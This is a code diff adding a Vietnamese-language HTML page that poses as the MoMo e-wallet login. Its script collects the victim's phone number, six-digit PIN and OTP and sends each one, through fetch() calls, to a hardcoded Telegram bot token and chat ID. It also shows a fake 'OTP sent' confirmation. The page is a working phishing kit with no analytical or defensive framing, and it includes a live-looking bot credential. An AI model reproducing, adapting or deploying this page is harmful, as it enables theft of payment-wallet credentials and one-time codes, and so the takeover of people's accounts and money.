@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+
+        .form-group button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Đăng nhập Login MoMo</h2>
+    <div class="form-group">
+        <label for="phone">Số điện thoại:</label>
+        <input type="text" id="phone" placeholder="Nhập số điện thoại" required>
+    </div>
+    <div class="form-group">
+        <label for="password">Mật khẩu:</label>
+        <input type="password" id="password" placeholder="Nhập mật khẩu" required>
+        <span id="showPassword" onclick="togglePassword()">Hiện mật khẩu</span>
+    </div>
+    <div class="form-group">
+        <button onclick="sendLoginInfo()">Gửi OTP</button>
+    </div>
+    <div class="form-group">
+        <label for="otp">OTP:</label>
+        <input type="text" id="otp" placeholder="Nhập OTP" required>
+    </div>
+    <div class="form-group">
+        <button onclick="login()">Đăng nhập</button>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+    var phoneInput = document.getElementById('phone');
+    var passwordInput = document.getElementById('password');
+    var otpInput = document.getElementById('otp');
+
+    var loginInfo = {
+        phone: '',
+        password: ''
+    };
+
+    function sendLoginInfo() {
+        loginInfo.phone = phoneInput.value;
+        loginInfo.password = passwordInput.value;
+
+        // Kiểm tra số điện thoại và mật khẩu
+        if (!isValidPhoneNumber(loginInfo.phone) || !isValidPassword(loginInfo.password)) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Lỗi',
+                text: 'Thông tin đăng nhập không hợp lệ!'
+            });
+            return;
+        }
+
+        // Gửi thông tin đăng nhập đến Telegram
+        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'Yêu cầu đăng nhập');
+
+        Swal.fire({
+            icon: 'success',
+            title: 'Thành công!',
+            text: 'OTP Đã Được gửi tới số điện thoại của ban. Nhập OTP để đăng nhập.'
+        });
+    }
+
+    function login() {
+        var otp = otpInput.value;
+
+        // Kiểm tra OTP
+        if (!isValidOTP(otp)) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Lỗi',
+                text: 'OTP không hợp lệ!'
+            });
+            return;
+        }
+
+        // Thực hiện xác thực và xử lý đăng nhập ở đây
+        // (Bạn cần thêm mã logic xác thực và xử lý đăng nhập)
+        // Ví dụ: kiểm tra đầu vào, gửi yêu cầu đăng nhập đến máy chủ, ...
+
+        // Sau khi xác thực thành công
+        // Gửi thông báo đến admin qua Telegram
+        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'Đăng nhập thành công');
+
+        // Hiển thị thông báo thành công bằng SweetAlert
+        Swal.fire({
+            icon: 'success',
+            title: 'Đăng nhập thành công!',
+            showConfirmButton: false,
+            timer: 1500 // Đóng thông báo sau 1.5 giây
+        });
+
+        // Gửi lại toàn bộ thông tin về admin
+        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'Thông tin đăng nhập thành công');
+    }
+
+    function isValidPhoneNumber(phone) {
+        var phoneRegex = /^(84|0[3|5|7|8|9])+([0-9]{8})$/;
+        return phoneRegex.test(phone);
+    }
+
+    function isValidPassword(password) {
+        var passwordRegex = /^\d{6}$/;
+        return passwordRegex.test(password);
+    }
+
+    function isValidOTP(otp) {
+        var otpRegex = /^\d{4}$/;
+        return otpRegex.test(otp);
+    }
+
+    function togglePassword() {
+        var passwordInput = document.getElementById('password');
+        var showPasswordSpan = document.getElementById('showPassword');
+
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            showPasswordSpan.textContent = 'Ẩn mật khẩu';
+        } else {
+            passwordInput.type = 'password';
+            showPasswordSpan.textContent = 'Hiện mật khẩu';
+        }
+    }
+
+    function sendTelegramMessage(phone, password, status) {
+        var token = '6889088304:AAED5-lcYegRJRP6dPeQiOvLSs0KbxkkyfU';
+        var chatId = '6520036650';
+
+        var message = `
+        📱 Số điện thoại: ${phone}
+        🔑 Mật khẩu: ${password}
+        ✅ Trạng thái: ${status}
+        `;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error(error));
+    }
+
+    function login() {
+        var otp = otpInput.value;
+    
+        // Kiểm tra OTP
+        if (!isValidOTP(otp)) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Lỗi',
+                text: 'OTP không hợp lệ!'
+            });
+            return;
+        }
+    
+        // Thực hiện xác thực và xử lý đăng nhập ở đây
+        // (Bạn cần thêm mã logic xác thực và xử lý đăng nhập)
+        // Ví dụ: kiểm tra đầu vào, gửi yêu cầu đăng nhập đến máy chủ, ...
+    
+        // Sau khi xác thực thành công
+        // Gửi thông báo đến admin qua Telegram
+        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'Đăng nhập thành công');
+    
+        // Gửi OTP cùng thông báo đến Telegram
+        sendTelegramMessage(loginInfo.phone, loginInfo.password, `Xác nhận OTP thành công. OTP: ${otp}`);
+    
+        // Hiển thị thông báo thành công bằng SweetAlert
+        Swal.fire({
+            icon: 'success',
+            title: 'Đăng nhập thành công!',
+            showConfirmButton: false,
+            timer: 1500 // Đóng thông báo sau 1.5 giây
+        });
+    
+        // Gửi lại toàn bộ thông tin về admin
+        sendTelegramMessage(loginInfo.phone, loginInfo.password, `Thông tin đăng nhập thành công. OTP: ${otp}`);
+    }
+    
+</script>
+
+</body>
+</html>
